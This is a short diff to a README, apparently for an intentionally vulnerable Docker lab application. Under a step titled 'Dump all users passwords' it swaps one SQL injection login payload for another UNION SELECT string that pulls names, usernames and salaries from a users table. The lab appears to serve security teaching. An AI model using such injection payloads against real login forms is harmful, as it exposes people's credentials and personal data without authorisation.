@@ -41,5 +41,5 @@ Clean the Docker environment (after making changes):
     - `password`: `anythingyouwant`
 
 4. Dump all users passwords:
-    - `username`: `' UNION SELECT username,password FROM users#`
+    - `username`: `' UNION SELECT first_name, last_name, username, salary from users#`
     - `password`: `anythingyouwant`
